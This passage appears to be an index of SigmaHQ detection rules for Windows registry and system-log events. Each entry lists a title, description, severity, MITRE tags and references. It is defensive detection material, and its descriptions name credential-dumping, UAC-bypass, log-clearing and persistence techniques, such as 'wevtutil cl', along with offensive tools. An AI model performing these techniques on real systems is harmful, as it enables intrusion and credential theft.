* https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf

    
### Leviathan Registry Key Activity
    
    Detects registry key used by Leviathan APT in Malaysian focused campaign

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_apt_leviathan.yml
* https://www.elastic.co/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign

    
### WINEKEY Registry Modification
    
    Detects potential malicious modification of run keys by winekey or team9 backdoor

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_runkey_winekey.yml
* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html

    
### PortProxy Registry Key
    
    Detects the modification of PortProxy registry key which is used for port forwarding. For command execution see rule win_netsh_port_fwd.yml.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1090
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_portproxy_registry_key.yml
* https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html

* https://adepts.of0x.cc/netsh-portproxy-code/

* https://www.dfirnotes.net/portproxy_detection/

    
### DNS ServerLevelPluginDll Install
    
    Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_dns_serverlevelplugindll.yml
* https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

    
### Path To Screensaver Binary Modified
    
    Detects value modification of registry key containing path to binary used as screensaver.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_modify_screensaver_binary_path.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md

* https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf

    
### CrashControl CrashDump Disabled
    
    Detects disabling the CrashDump per registry (as used by HermeticWiper)

    * Level: medium
    * MITRE: attack.t1564
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_crashdump_disabled.yml
* https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/

    
### DLL Load via LSASS
    
    Detects a method to load DLL via LSASS process using an undocumented Registry key

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.t1547.008
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_susp_lsass_dll_load.yml
* https://blog.xpnsec.com/exploring-mimikatz-part-1/

* https://twitter.com/SBousseaden/status/1183745981189427200

    
### New DLL Added to AppCertDlls Registry Key
    
    Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1546.009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_new_dll_added_to_appcertdlls_registry_key.yml
* http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/

* https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html

    
### RedMimicry Winnti Playbook Registry Manipulation
    
    Detects actions caused by the RedMimicry Winnti playbook

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_redmimicry_winnti_reg.yml
* https://redmimicry.com

    
### OceanLotus Registry Activity
    
    Detects registry keys created in OceanLotus (also known as APT32) attacks

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_apt_oceanlotus_registry.yml
* https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/

* https://github.com/eset/malware-ioc/tree/master/oceanlotus

    
### FlowCloud Malware
    
    Detects FlowCloud malware from threat group TA410.

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_mal_flowcloud.yml
* https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new

    
### Chafer Activity
    
    Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.g0049
    * MITRE: attack.t1053.005
    * MITRE: attack.s0111
    * MITRE: attack.t1543.003
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_apt_chafer_mar18.yml
* https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/

    
### Windows Credential Editor Registry
    
    Detects the use of Windows Credential Editor (WCE)

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_hack_wce_reg.yml
* https://www.ampliasecurity.com/research/windows-credentials-editor/

    
### Run Once Task Configuration in Registry
    
    Rule to detect the configuration of Run Once registry key. Configured payload can be run by runonce.exe /AlternateShellStartup

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_runonce_persistence.yml
* https://twitter.com/pabraeken/status/990717080805789697

* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml

    
### NetNTLM Downgrade Attack
    
    Detects NetNTLM downgrade attack

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_net_ntlm_downgrade.yml
* https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks

    
### Wdigest CredGuard Registry Modification
    
    Detects potential malicious modification of the property value of IsCredGuardEnabled from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to disable Cred Guard on a system. This is usually used with UseLogonCredential to manipulate the caching credentials.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_disable_wdigest_credential_guard.yml
* https://teamhydra.blog/2020/08/25/bypassing-credential-guard/

    
### New DLL Added to AppInit_DLLs Registry Key
    
    DLLs that are specified in the AppInit_DLLs value in the Registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1546.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_new_dll_added_to_appinit_dlls_registry_key.yml
* https://eqllib.readthedocs.io/en/latest/analytics/822dc4c5-b355-4df8-bd37-29c458997b8f.html

    
### Sticky Key Like Backdoor Usage
    
    Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.t1546.008
    * MITRE: car.2014-11-003
    * MITRE: car.2014-11-008
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_stickykey_like_backdoor.yml
* https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/

    
### Narrator's Feedback-Hub Persistence
    
    Detects abusing Windows 10 Narrator's Feedback-Hub

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_narrator_feedback_persistance.yml
* https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html

    
### Creation of a Local Hidden User Account by Registry
    
    Sysmon registry detection of a local hidden user account.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_add_local_hidden_user.yml
* https://twitter.com/SBousseaden/status/1387530414185664538

    
### Atbroker Registry Change
    
    Detects creation/modification of Assisitive Technology applications and persistence with usage of ATs

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.persistence
    * MITRE: attack.t1547
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_susp_atbroker_change.yml
* http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/

* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Atbroker.yml

    
### Suspicious Run Key from Download
    
    Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_susp_download_run_key.yml
* https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/

    
### Windows Registry Trust Record Modification
    
    Alerts on trust record modification within the registry, indicating usage of macros

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_trust_record_modification.yml
* https://outflank.nl/blog/2018/01/16/hunting-for-evil-detect-macros-being-executed/

* http://az4n6.blogspot.com/2016/02/more-on-trust-records-macros-and.html

    
### Shell Open Registry Keys Manipulation
    
    Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: attack.t1546.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_shell_open_keys_manipulation.yml
* https://github.com/hfiref0x/UACME

* https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/

* https://github.com/RhinoSecurityLabs/Aggressor-Scripts/tree/master/UACBypass

* https://tria.ge/211119-gs7rtshcfr/behavioral2 [Lokibot sample from Nov 2021]

    
### Suspicious Camera and Microphone Access
    
    Detects Processes accessing the camera and microphone from suspicious folder

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1125
    * MITRE: attack.t1123
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_susp_mic_cam_access.yml
* https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072

    
### Registry Entries For Azorult Malware
    
    Detects the presence of a registry key created during Azorult execution

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_mal_azorult.yml
* https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.azoruit.a

    
### Office Application Startup - Office Test
    
    Detects the addition of office test registry that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1137.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_office_test_regadd.yml
* https://attack.mitre.org/techniques/T1137/002/

    
### Disable Security Events Logging Adding Reg Key MiniNt
    
    Detects the addition of a key 'MiniNt' to the registry. Upon a reboot, Windows Event Log service will stopped write events.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_disable_security_events_logging_adding_reg_key_minint.yml
* https://twitter.com/0gtweet/status/1182516740955226112

    
### UAC Bypass Via Wsreset
    
    Unfixed method for UAC bypass from windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_bypass_via_wsreset.yml
* https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly

* https://lolbas-project.github.io/lolbas/Binaries/Wsreset

    
### CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum
    
    Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1566
    * MITRE: attack.t1203
    * MITRE: cve.2021.33771
    * MITRE: cve.2021.31979
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_cve_2021_31979_cve_2021_33771_exploits.yml
* https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/

* https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/

    
### Security Support Provider (SSP) Added to LSA Configuration
    
    Detects the addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1547.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_ssp_added_lsa_config.yml
* https://attack.mitre.org/techniques/T1101/

* https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/

    
### PrinterNightmare Mimimkatz Driver Name
    
    Detects static QMS 810 and mimikatz driver name used by Mimikatz as exploited in CVE-2021-1675 and CVE-2021-34527

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1204
    * MITRE: cve.2021.1675
    * MITRE: cve.2021.34527
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_mimikatz_printernightmare.yml
* https://github.com/gentilkiwi/mimikatz/commit/c21276072b3f2a47a21e215a46962a17d54b3760

* https://www.lexjansen.com/sesug/1993/SESUG93035.pdf

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913

    
### Esentutl Volume Shadow Copy Service Keys
    
    Detects the volume shadow copy service initialization and processing via esentutl. Registry keys such as HKLM\\System\\CurrentControlSet\\Services\\VSS\\Diag\\VolSnap\\Volume are captured.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_esentutl_volume_shadow_copy_service_keys.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy

    
### SilentProcessExit Monitor Registrytion for LSASS
    
    Detects changes to the Registry in which a monitor program gets registered to dump process memory of the lsass.exe process memory

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_silentprocessexit_lsass.yml
* https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/

* https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

    
### CMSTP Execution Registry Event
    
    Detects various indicators of Microsoft Connection Manager Profile Installer execution

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1218.003
    * MITRE: attack.g0069
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_cmstp_execution_by_registry.yml
* https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/

    
### HybridConnectionManager Service Installation
    
    Detects the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function.

    * Level: high
    * MITRE: attack.resource_development
    * MITRE: attack.t1608
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_event/registry_event_hybridconnectionmgr_svc_installation.yml
* https://twitter.com/Cyb3rWard0g/status/1381642789369286662

    
### Outgoing Logon with New Credentials
    
    Detects logon events that specify new credentials

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/win_susp_logon_newcredentials.yml
* https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf

    
### Mimikatz Use
    
    This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)

    * Level: critical
    * MITRE: attack.s0002
    * MITRE: attack.lateral_movement
    * MITRE: attack.credential_access
    * MITRE: car.2013-07-001
    * MITRE: car.2019-04-004
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml
* https://tools.thehacker.recipes/mimikatz/modules

    
### System Eventlog Cleared
    
    One of the Windows Core Eventlogs has been cleared. e.g. caused by "wevtutil cl" command execution

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.001
    * MITRE: car.2016-04-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_system_susp_eventlog_cleared.yml
* https://twitter.com/deviouspolack/status/832535435960209408

* https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100

    
### Invoke-Obfuscation RUNDLL LAUNCHER
    
    Detects Obfuscated Powershell via RUNDLL LAUNCHER

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_rundll_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### KrbRelayUp Service Installation
    
    Detects service creation from KrbRelayUp tool used for privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings)

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_security_krbrelayup_service_installation.yml
* https://github.com/Dec0ne/KrbRelayUp

    
### Invoke-Obfuscation Via Use Rundll32
    
    Detects Obfuscated Powershell via use Rundll32 in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_use_rundll32_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### CobaltStrike Service Installations
    
    Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1543.003
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_cobaltstrike_service_installs.yml
* https://www.sans.org/webcasts/119395

* https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/

* https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/

    
### Invoke-Obfuscation Obfuscated IEX Invocation
    
    Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_obfuscated_iex_services.yml
* https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888

    
### Invoke-Obfuscation COMPRESS OBFUSCATION
    
    Detects Obfuscated Powershell via COMPRESS OBFUSCATION

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_compress_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### StoneDrill Service Install
    
    This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.g0064
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_apt_stonedrill.yml
* https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/

    
### DHCP Server Loaded the CallOut DLL
    
    This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_dhcp_config.yml
* https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html

* https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx

* https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx

    
### Turla Service Install
    
    This method detects a service install of malicious services mentioned in Carbon Paper - Turla report by ESET

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.g0010
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_apt_carbonpaper_turla.yml
* https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/

    
### Rare Service Installations
    
    Detects rare service installs that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious services

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: car.2013-09-005
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_rare_service_installs.yml
    
### Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION
    
    Detects Obfuscated Powershell via VAR++ LAUNCHER

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_var_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Vulnerable Netlogon Secure Channel Connection Allowed
    
    Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_vul_cve_2020_1472.yml
* https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc

    
### Windows Update Error
    
    Windows Update get some error Check if need a 0-days KB

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.resource_development
    * MITRE: attack.t1584
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_system_update_error.yml
    
### Invoke-Obfuscation VAR+ Launcher
    
    Detects Obfuscated use of Environment Variables to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_var_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### smbexec.py Service Installation
    
    Detects the use of smbexec.py tool by detecting a specific service installation

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.execution
    * MITRE: attack.t1021.002
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_hack_smbexec.yml
* https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

    
### Volume Shadow Copy Mount
    
    Detects volume shadow copy mount

    * Level: low
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_volume_shadow_copy_mount.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy

    
### Chafer Activity
    
    Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.g0049
    * MITRE: attack.t1053.005
    * MITRE: attack.s0111
    * MITRE: attack.t1543.003
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_apt_chafer_mar18_system.yml
* https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/

    
### Suspicious Service Installation Script
    
    Detects suspicious service installation scripts

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: car.2013-09-005
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_service_installation_script.yml
    
### Exploit SamAccountName Spoofing with Kerberos
    
    The attacker creates a computer object using those permissions with a password known to her.
After that she clears the attribute ServicePrincipalName on the computer object.
Because she created the object (CREATOR OWNER), she gets granted additional permissions and can do many changes to the object.


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_vul_cve_2021_42278_or_cve_2021_42287.yml
* https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/

    
### SAM Dump to AppData
    
    Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_sam_dump.yml
    
### Invoke-Obfuscation Via Use Clip
    
    Detects Obfuscated Powershell via use Clip.exe in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_use_clip_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Windows Pcap Drivers
    
    Detects Windows Pcap driver installation based on a list of associated .sys files.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.credential_access
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_pcap_drivers.yml
* https://ragged-lab.blogspot.com/2020/06/capturing-pcap-driver-installations.html#more

    
### Tap Driver Installation
    
    Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_tap_driver_installation.yml
    
### Meterpreter or Cobalt Strike Getsystem Service Installation
    
    Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1134.001
    * MITRE: attack.t1134.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

    
### Potential RDP Exploit CVE-2019-0708
    
    Detect suspicious error on protocol RDP, potential CVE-2019-0708

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1210
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_rdp_potential_cve_2019_0708.yml
* https://github.com/zerosum0x0/CVE-2019-0708

* https://github.com/Ekultek/BlueKeep

    
### Moriya Rootkit
    
    Detects the use of Moriya rootkit as described in the securelist's Operation TunnelSnake report

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_moriya_rootkit.yml
